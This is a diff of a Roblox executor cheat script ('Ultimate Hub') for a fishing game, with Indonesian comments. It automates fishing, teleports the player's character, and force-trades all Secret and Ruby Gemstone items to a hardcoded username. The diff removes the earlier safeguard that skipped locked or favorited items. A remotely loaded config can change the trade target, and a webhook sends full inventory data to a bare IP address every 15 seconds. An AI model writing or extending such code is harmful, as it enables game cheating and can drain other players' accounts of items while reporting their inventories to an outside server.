@@ -1,7 +1,7 @@
 repeat task.wait() until game:IsLoaded()
 
 -- ======================================================
--- # ULTIMATE HUB: FINAL V4 (NEW DASHBOARD + FIXES)
+-- # ULTIMATE HUB: FINAL V4.5 (GEM & SECRET TRADE EDITION)
 -- ======================================================
 
 -- [1] SETUP URL CONFIG KAMU DISINI
@@ -35,7 +35,7 @@ local MasterConfig = {
     PotatoMode = true,
     AutoTrade = true,
     TargetUsername = "mm3kenak",
-    TradeMode = "SECRETS_FIRST",
+    TradeMode = "SECRETS_FIRST", -- Mode ini sekarang dimodif khusus Secret & Gem Only
     TradeDelay = 6.5,
     WebhookEnabled = true,
     WebhookUrl = "http://43.134.116.2:5000/webhook/fishit",
@@ -50,13 +50,14 @@ local PotatoLoopThread = nil
 -- VARIABLES GLOBAL
 local SessionStartTime = os.time()
 local TotalSecretsFound = 0
+local TotalRubyGemstones = 0 -- [BARU] Variabel Gemstone
 local TotalFishCaught = 0
 local FishSessionMap = {}
 
 -- FORWARD DECLARATION
-local StartFishingV1, StopFishingV1, RunAutoTrade, TeleportToFishingLocation, CreateDashboard
+local StartFishingV1, StopFishingV1, RunAutoTrade, TeleportToFishingLocation, CreateDashboard, UpdateStatsFromInventory
 
--- [3] WEB CONFIG LOADER (AUTO UPDATE - FIXED TELEPORT)
+-- [3] WEB CONFIG LOADER
 local function LoadWebConfig()
     if not OnlineConfigUrl or OnlineConfigUrl == "" or OnlineConfigUrl:find("example.com") then return end
 
@@ -74,6 +75,10 @@ local function LoadWebConfig()
             for key, value in pairs(decodedData) do
                 if MasterConfig[key] ~= value then
                     if key == "SelectedLocation" then locationChanged = true end
+                    
+                    -- Reset TargetId jika username berubah agar discan ulang
+                    if key == "TargetUsername" then MasterConfig.TargetId = nil end
+
                     MasterConfig[key] = value
                     settingsChanged = true
                 end
@@ -82,9 +87,7 @@ local function LoadWebConfig()
             -- DYNAMIC SWITCHING
             if settingsChanged then
                 if locationChanged and MasterConfig.AutoTeleport then
-                    if TeleportToFishingLocation then 
-                        task.spawn(TeleportToFishingLocation) 
-                    end
+                    if TeleportToFishingLocation then task.spawn(TeleportToFishingLocation) end
                 end
 
                 if MasterConfig.FishingEnabled and not FishingState.IsFishing then
@@ -231,6 +234,34 @@ local function FormatTime(seconds)
 end
 
 -- ===============================
+-- HELPER: UPDATE STATS (SECRET & GEM)
+-- ===============================
+UpdateStatsFromInventory = function()
+    local secretCount = 0
+    local rubyGemCount = 0
+    
+    local inv = PlayerData:Get("Inventory")
+    if inv then
+        for _, items in pairs(inv) do
+             for _, item in ipairs(items) do
+                 local name, r = GetFishNameAndRarity(item)
+                 local mut = GetMutation(item)
+                 
+                 if tostring(r):upper() == "SECRET" then
+                      secretCount = secretCount + 1
+                 end
+                 
+                 if name == "Ruby" and mut == "Gemstone" then
+                      rubyGemCount = rubyGemCount + 1
+                 end
+            end
+        end
+    end
+    TotalSecretsFound = secretCount
+    TotalRubyGemstones = rubyGemCount
+end
+
+-- ===============================
 -- DISCORD WEBHOOK LOGIC
 -- ===============================
 local function SendDiscordSecretNotification(fishName, rarity, mutation, weight)
@@ -364,9 +395,7 @@ local function RunAutoUnfavoriteRubies()
                         local mutation = GetMutation(item)
                         if mutation ~= "Gemstone" then
                             pcall(function()
-                                if RE_FavoriteItem then
-                                    RE_FavoriteItem:FireServer(item.UUID)
-                                end
+                                if RE_FavoriteItem then RE_FavoriteItem:FireServer(item.UUID) end
                             end)
                             task.wait(0.2)
                         end
@@ -436,9 +465,7 @@ function StartFishingV1()
 
     table.insert(FishingThreads, task.spawn(function()
         while FishingState.IsFishing do
-            if MasterConfig.AutoUnfavoriteRubies then
-                RunAutoUnfavoriteRubies()
-            end
+            if MasterConfig.AutoUnfavoriteRubies then RunAutoUnfavoriteRubies() end
             task.wait(5)
         end
     end))
@@ -468,9 +495,7 @@ function TeleportToFishingLocation()
     pcall(function()
         local char = lp.Character or lp.CharacterAdded:Wait()
         local root = char:WaitForChild("HumanoidRootPart", 5)
-        if root then 
-            root.CFrame = CFrame.new(loc.Pos, loc.Pos + loc.Look)
-        end
+        if root then root.CFrame = CFrame.new(loc.Pos, loc.Pos + loc.Look) end
     end)
     task.wait(0.5)
     FishingState.Teleporting = false
@@ -522,15 +547,9 @@ local function StartAutoTotemLoop()
 end
 
 -- ===============================
--- TRADING LOGIC (FIXED & IMPROVED)
+-- TRADING LOGIC (SECRET & RUBY GEM ONLY + FORCE TRADE)
 -- ===============================
 local RF_InitiateTrade = GetRemote("RF/InitiateTrade")
-
-local function IsItemTradeable(item)
-    -- Jangan trade item yang sedang dipakai, dilock, atau difavoritkan
-    if item.Locked or item.Favorited or item.IsFavorite then return false end
-    return true
-end
 
 local function ScanInventoryForTrade()
     local tradeList = {}
@@ -540,111 +559,30 @@ local function ScanInventoryForTrade()
     
     for _, items in pairs(inv) do
         for _, item in ipairs(items) do
-            if IsItemTradeable(item) then
-                local name, rarity = GetFishNameAndRarity(item)
-                local mutation = GetMutation(item)
+            -- Filter: Hanya Secret atau Ruby Gemstone
+            local name, rarity = GetFishNameAndRarity(item)
+            local mutation = GetMutation(item)
+            
+            local isSecret = (tostring(rarity):upper() == "SECRET")
+            local isRubyGem = (name == "Ruby" and mutation == "Gemstone")
+            
+            if isSecret or isRubyGem then
+                -- Prioritas: Secret (Angka 2) > Ruby Gem (Angka 1)
+                local priority = 1
+                if isSecret then priority = 2 end
                 
-                local isSecret = (tostring(rarity):upper() == "SECRET")
-                local isRubyGem = (name == "Ruby" and mutation == "Gemstone")
-                local isRareMutation = (string.find(mutation:lower(), "leviathan") or string.find(mutation:lower(), "rage"))
-                
-                -- LOGIKA FILTER BERDASARKAN CONFIG
-                local shouldTrade = false
-                
-                if MasterConfig.TradeMode == "ALL" then
-                    -- Trade SEMUA ikan (Common sampai Secret)
-                    shouldTrade = true
-                elseif MasterConfig.TradeMode == "SECRETS_FIRST" then
-                    -- Hanya Secret & Mutasi Langka
-                    if isSecret or isRubyGem or isRareMutation then shouldTrade = true end
-                elseif MasterConfig.TradeMode == "RUBY_GEMSTONE" then
-                    -- Hanya Ruby Gemstone
-                    if isRubyGem then shouldTrade = true end
-                end
-
-                if shouldTrade then
-                    -- Prioritaskan Secret agar ditrade duluan
-                    local priority = 1
-                    if isSecret then priority = 3
-                    elseif isRubyGem then priority = 2 end
-                    
-                    table.insert(tradeList, {
-                        uuid = item.UUID, 
-                        name = name, 
-                        rarity = rarity, 
-                        priority = priority
-                    })
-                end
+                table.insert(tradeList, {
+                    uuid = item.UUID,
+                    priority = priority
+                })
             end
         end
     end
     
-    -- Urutkan item biar yang mahal ditrade duluan
+    -- Urutkan: Secret didahulukan
     table.sort(tradeList, function(a, b) return a.priority > b.priority end)
     
     return tradeList
-end
-
-local function IsItemStillInInventory(uuid)
-    local inv = PlayerData:GetExpect("Inventory")
-    if not inv then return false end
-    for _, items in pairs(inv) do
-        for _, item in ipairs(items) do 
-            if item.UUID == uuid then return true end 
-        end
-    end
-    return false
-end
-
-function RunAutoTrade()
-    if TradingState.IsTrading then return end
-    TradingState.IsTrading = true
-    
-    print("♻️ [Auto Trade] Dimulai...")
-
-    TradingState.Thread = task.spawn(function()
-        while MasterConfig.AutoTrade and TradingState.IsTrading do
-            -- 1. Pastikan kita punya Target ID
-            if not MasterConfig.TargetId or MasterConfig.TargetId == 0 then
-                pcall(function()
-                    MasterConfig.TargetId = Services.Players:GetUserIdFromNameAsync(MasterConfig.TargetUsername)
-                end)
-            end
-
-            -- [LOGIKA BARU] Cek apakah player benar-benar ada di dalam server (Ingame)
-            -- Kita cari object playernya berdasarkan ID
-            local targetPlayerIngame = Services.Players:GetPlayerByUserId(MasterConfig.TargetId)
-
-            if targetPlayerIngame then
-                -- === JIKA PLAYER ADA DI SERVER, BARU KITA SCAN DAN TRADE ===
-                local itemsToTrade = ScanInventoryForTrade()
-                
-                if #itemsToTrade > 0 then
-                    local targetItem = itemsToTrade[1]
-                    pcall(function() 
-                        RF_InitiateTrade:InvokeServer(MasterConfig.TargetId, targetItem.uuid) 
-                    end)
-                    
-                    -- Tunggu item terkirim
-                    local start = os.clock()
-                    repeat 
-                        task.wait(0.5) 
-                    until not IsItemStillInInventory(targetItem.uuid) or (os.clock() - start) > 5
-                else
-                    task.wait(2) -- Tidak ada item, tunggu sebentar
-                end
-
-            else
-                -- === JIKA PLAYER TIDAK DITEMUKAN DI SERVER ===
-                -- Kita tunggu saja, jangan spam remote trade
-                -- print("⏳ Target tidak terdeteksi di server, menunggu dia join...")
-                task.wait(3) 
-            end
-            
-            task.wait(MasterConfig.TradeDelay)
-        end
-        TradingState.IsTrading = false
-    end)
 end
 
 local function IsItemStillInInventory(uuid)
@@ -660,29 +598,47 @@ function RunAutoTrade()
     if TradingState.IsTrading then return end
     TradingState.IsTrading = true
     
+    print("♻️ [Auto Trade] Mode: Secret & Ruby Gem Only (Active Scan)")
+
     TradingState.Thread = task.spawn(function()
         while MasterConfig.AutoTrade and TradingState.IsTrading do
-            local secrets, specialMutations = ScanInventoryForTrade()
-            if #secrets > 0 or #specialMutations > 0 then
-                local tradeUUID = nil
-                if MasterConfig.TradeMode == "SECRETS_FIRST" then
-                    if #secrets > 0 then tradeUUID = secrets[1].uuid
-                    elseif #specialMutations > 0 then tradeUUID = specialMutations[1].uuid end
-                elseif MasterConfig.TradeMode == "RUBY_GEMSTONE" then
-                    for _, item in ipairs(specialMutations) do
-                        if item.name == "Ruby" and item.mutation == "Gemstone" then tradeUUID = item.uuid; break end
-                    end
-                elseif MasterConfig.TradeMode == "ALL" then
-                    if #secrets > 0 then tradeUUID = secrets[1].uuid
-                    elseif #specialMutations > 0 then tradeUUID = specialMutations[1].uuid end
-                end
+            -- [STEP 1] Update Stats di GUI setiap loop agar angka real-time
+            pcall(UpdateStatsFromInventory)
+            
+            local targetName = MasterConfig.TargetUsername
+            -- Cek apakah player ada di server (Refresh Ingame)
+            local targetPlayer = Services.Players:FindFirstChild(targetName)
+
+            if targetPlayer then
+                MasterConfig.TargetId = targetPlayer.UserId 
+
+                local itemsToTrade = ScanInventoryForTrade()
                 
-                if tradeUUID then
-                    pcall(function() RF_InitiateTrade:InvokeServer(MasterConfig.TargetId, tradeUUID) end)
+                if #itemsToTrade > 0 then
+                    local targetItem = itemsToTrade[1]
+                    
+                    -- Langsung Trade (Force Trade)
+                    pcall(function() 
+                        RF_InitiateTrade:InvokeServer(targetPlayer.UserId, targetItem.uuid) 
+                    end)
+                    
+                    -- Tunggu proses trade selesai (atau gagal/timeout)
                     local start = os.clock()
-                    repeat task.wait(0.5) until not IsItemStillInInventory(tradeUUID) or (os.clock() - start) > 10
+                    repeat 
+                        task.wait(0.5) 
+                    until not IsItemStillInInventory(targetItem.uuid) or (os.clock() - start) > 5
+                    
+                    -- [STEP 2] Update Stats lagi segera setelah trade selesai
+                    pcall(UpdateStatsFromInventory)
+                else
+                    -- Jika inventory kosong dari item target, cek cepat lagi nanti
+                    task.wait(1)
                 end
+            else
+                -- Target tidak ada, standby
+                task.wait(3)
             end
+            
             task.wait(MasterConfig.TradeDelay)
         end
         TradingState.IsTrading = false
@@ -690,24 +646,8 @@ function RunAutoTrade()
 end
 
 -- ===============================
--- GUI (DASHBOARD) - UPDATED V1.3.2
+-- GUI (DASHBOARD) - UPDATED
 -- ===============================
-local function UpdateTotalSecretsFromInventory()
-    local count = 0
-    local inv = PlayerData:Get("Inventory")
-    if inv then
-        for _, items in pairs(inv) do
-             for _, item in ipairs(items) do
-                 local _, r = GetFishNameAndRarity(item)
-                 if tostring(r):upper() == "SECRET" then
-                     count = count + 1
-                 end
-            end
-        end
-    end
-    TotalSecretsFound = count
-end
-
 function CreateDashboard()
     if Services.CoreGui:FindFirstChild("EnochDashboard") then 
         Services.CoreGui.EnochDashboard:Destroy() 
@@ -722,7 +662,7 @@ function CreateDashboard()
     toggleBtn.Position = UDim2.new(0.5, 0, 0.95, 0)
     toggleBtn.AnchorPoint = Vector2.new(0.5, 1)
     toggleBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
-    toggleBtn.Text = "W - v1.3.3 (Trade Monitor)" -- Update versi
+    toggleBtn.Text = "W - v1.4 (Gem & Secret)"
     toggleBtn.TextColor3 = Color3.new(1,1,1)
     toggleBtn.Font = Enum.Font.GothamBold
     toggleBtn.TextScaled = true
@@ -736,7 +676,7 @@ function CreateDashboard()
     local layout = Instance.new("UIListLayout", dashboard)
     layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
     layout.VerticalAlignment = Enum.VerticalAlignment.Center
-    layout.Padding = UDim.new(0.015, 0) -- Padding sedikit dikecilkan biar muat
+    layout.Padding = UDim.new(0.015, 0)
 
     local function Text(txt, h, col) 
         local l = Instance.new("TextLabel", dashboard)
@@ -749,18 +689,16 @@ function CreateDashboard()
         return l 
     end
 
-    -- === DEFINISI LABEL ===
     local L_Coins  = Text("$0", 0.10, Color3.fromRGB(255, 215, 0)) 
-    local L_Mode   = Text("MODE: ...", 0.06, Color3.fromRGB(0, 255, 255)) 
-    local L_Target = Text("TARGET: ...", 0.06, Color3.fromRGB(200, 200, 200)) -- [BARU] Label Target
-    local L_Stats  = Text("0 | 0.0 F/M", 0.06, Color3.fromRGB(255, 255, 255)) 
+    local L_Mode   = Text("LOC: ...", 0.06, Color3.fromRGB(0, 255, 255)) 
+    local L_Target = Text("TARGET: ...", 0.06, Color3.fromRGB(200, 200, 200)) 
+    local L_Stats  = Text("0 Fish", 0.06, Color3.fromRGB(255, 255, 255)) 
+    -- [BARU] Menampilkan Secret & Ruby Gem
+    local L_Info   = Text("Sec: 0 | Gem: 0", 0.06, Color3.fromRGB(255, 100, 255)) 
     local L_Time   = Text("00h 00m 00s", 0.05, Color3.fromRGB(180, 180, 180)) 
-    local L_Info   = Text("...", 0.05, Color3.fromRGB(200, 200, 200)) 
     local L_Status = Text("Starting...", 0.05, Color3.fromRGB(255, 100, 100)) 
 
-    toggleBtn.MouseButton1Click:Connect(function() 
-        dashboard.Visible = not dashboard.Visible 
-    end)
+    toggleBtn.MouseButton1Click:Connect(function() dashboard.Visible = not dashboard.Visible end)
 
     task.spawn(function()
         while task.wait(0.5) do
@@ -768,36 +706,28 @@ function CreateDashboard()
                 L_Coins.Text = "$" .. FormatNumber(GetCoins())
                 L_Mode.Text = "LOC: " .. (MasterConfig.SelectedLocation or "None")
                 
-                -- === [LOGIKA BARU STATUS TARGET] ===
                 local tName = MasterConfig.TargetUsername or "???"
-                -- Cek real-time apakah player ada di server
                 local tPlayer = Services.Players:FindFirstChild(tName)
-                
                 if tPlayer then
                     L_Target.Text = "TARGET: " .. tName .. " [✅]"
-                    L_Target.TextColor3 = Color3.fromRGB(0, 255, 100) -- Hijau Neon
+                    L_Target.TextColor3 = Color3.fromRGB(0, 255, 100)
                 else
                     L_Target.Text = "TARGET: " .. tName .. " [❌]"
-                    L_Target.TextColor3 = Color3.fromRGB(255, 50, 50) -- Merah
+                    L_Target.TextColor3 = Color3.fromRGB(255, 50, 50)
                 end
-                -- ===================================
 
                 local elapsed = os.time() - SessionStartTime
-                local fpm = TotalFishCaught / (math.max(elapsed, 1) / 60)
-                L_Stats.Text = string.format("%d Fish | %.1f F/M", TotalFishCaught, fpm)
+                L_Stats.Text = string.format("Caught: %d", TotalFishCaught)
+                
+                -- [BARU] Update Label Info dengan data Secret & Ruby Gem
+                L_Info.Text = "Sec: " .. TotalSecretsFound .. " | Gem: " .. TotalRubyGemstones
                 
                 L_Time.Text = FormatTime(elapsed)
-                L_Info.Text = "Secrets: " .. TotalSecretsFound
                 
                 local currentStatus = "Idle"
                 if FishingState.IsFishing then currentStatus = "Fishing" end
                 if TradingState.IsTrading then 
-                    -- Jika sedang mode trade, status lebih detail
-                    if tPlayer then
-                        currentStatus = "Trading (Active)"
-                    else
-                        currentStatus = "Trading (Waiting Target)"
-                    end
+                    currentStatus = tPlayer and "Trading (Active)" or "Trading (Waiting)"
                 end
                 if FishingState.Teleporting then currentStatus = "Teleporting" end
                 
@@ -823,7 +753,7 @@ if RE_ObtainedNewFishNotification then
             end)
 
             if isSecret then
-                TotalSecretsFound = TotalSecretsFound + 1
+                pcall(UpdateStatsFromInventory) -- Auto update jika dapet secret
                 if MasterConfig.DiscordWebhookEnabled then
                     local weight = (item.Metadata and item.Metadata.Weight) or 0
                     SendDiscordSecretNotification(name, rarity, mutation, weight)
@@ -867,17 +797,13 @@ if MasterConfig.WebhookEnabled then
                             if mut ~= "None" then dName = "["..mut.."] "..n end
                             exportData.Summary[dName] = (exportData.Summary[dName] or 0) + 1
                             table.insert(exportData.Details, {
-                                Name = dName,
-                                Rarity = r,
-                                Weight = item.Metadata and item.Metadata.Weight or 0,
-                                Mutation = mut,
-                                UniqueId = item.UUID or item.Id
+                                Name = dName, Rarity = r, Weight = item.Metadata and item.Metadata.Weight or 0,
+                                Mutation = mut, UniqueId = item.UUID or item.Id
                             })
                         end
                     end
                 end
             end
-            
             SendHook(lp.Name, exportData)
             task.wait(15)
         end
@@ -885,7 +811,7 @@ if MasterConfig.WebhookEnabled then
 end
 
 -- ===============================
--- AUTO-START EXECUTION (FIXED LOADING ORDER & WAITING STATUS)
+-- AUTO-START EXECUTION
 -- ===============================
 task.delay(2, function()
     print("[AutoStart] Memuat Config Web Terlebih Dahulu...")
@@ -898,8 +824,8 @@ task.delay(2, function()
     
     print("[AutoStart] Config Web Loaded. Lokasi: " .. MasterConfig.SelectedLocation)
     
-    -- [4] LANJUTKAN EKSEKUSI NORMAL
-    pcall(UpdateTotalSecretsFromInventory)
+    -- [3] Hitung Stats Awal
+    pcall(UpdateStatsFromInventory)
 
     if req and MasterConfig.DiscordWebhookEnabled and MasterConfig.DiscordWebhookUrl ~= "" then
        pcall(function() 
@@ -924,11 +850,8 @@ task.delay(2, function()
     if MasterConfig.PotatoMode then StartPotatoLoop() end
     if MasterConfig.FishingEnabled then StartFishingV1() end
     
+    -- [4] Jalankan Auto Trade (Logic baru akan handle ID secara otomatis)
     if MasterConfig.AutoTrade then
-        local s, id = pcall(function() return Services.Players:GetUserIdFromNameAsync(MasterConfig.TargetUsername) end)
-        if s and id then 
-            MasterConfig.TargetId = id
-            RunAutoTrade() 
-        end
+        RunAutoTrade()
     end
 end)
